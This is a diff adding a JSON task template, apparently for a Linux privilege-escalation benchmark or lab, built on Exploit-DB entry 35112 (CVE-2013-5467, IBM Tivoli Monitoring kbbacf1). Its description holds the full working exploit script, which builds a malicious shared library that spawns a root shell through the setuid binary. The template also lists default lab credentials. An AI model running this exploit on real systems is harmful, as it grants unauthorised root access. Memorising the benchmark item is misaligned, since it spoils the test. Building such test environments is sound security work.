@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_35112",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: IBM Tivoli Monitoring 6.2.2 kbbacf1 - Local Privilege Escalation (CVE-2013-5467;OSVDB-110484)\n\nExploit source code (35112.sh):\n```\n#!/bin/sh\n# Title: IBM Tivoli Monitoring V6.2.2 kbbacf1 privilege escalation exploit\n# CVE: CVE-2013-5467\n# Vendor Homepage: http://www-03.ibm.com/software/products/pl/tivomoni\n# Author: Robert Jaroszuk\n# Tested on: RedHat 5, Centos 5\n# Vulnerable version: IBM Tivoli Monitoring V6.2.2 (other versions not tested)\n#\necho \"[+] Tivoli pwner kbbacf1 privilege escalation exploit by Robert Jaroszuk\"\necho \"[+] Preparing the code...\"\ncat > kbbacf1-pwn.c << DONE\n#define _GNU_SOURCE\n#include <unistd.h>\n#include <stdlib.h>\n#include <dlfcn.h>\n\nvoid __cxa_finalize (void *d) {\n    return;\n}\n\nvoid __attribute__((constructor)) init() {\n    setresuid(geteuid(), geteuid(), geteuid());\n    execl(\"/bin/sh\", (char *)NULL, (char *)NULL);\n}\nDONE\n\ncat > version << DONE\nGLIBC_2.2.5 { };\nGLIBC_2.3 { };\nGLIBC_2.3.2 { };\nGLIBC_PRIVATE { };\nDONE\necho \"[+] Preparing the code... part2\"\n/usr/bin/gcc -Wall -fPIC -shared -static-libgcc -Wl,--version-script=version -o libcrypt.so.1 kbbacf1-pwn.c\n\necho \"[+] Cleaning up...\"\n/bin/rm -f kbbacf1-pwn.c version\n\necho \"[+] Exploiting.\"\n/opt/IBM/ITM/tmaitm6/lx8266/bin/kbbacf1\n```",
+  "cve": "CVE-2013-5467;OSVDB-110484",
+  "exploitdb_id": "35112",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_35112",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
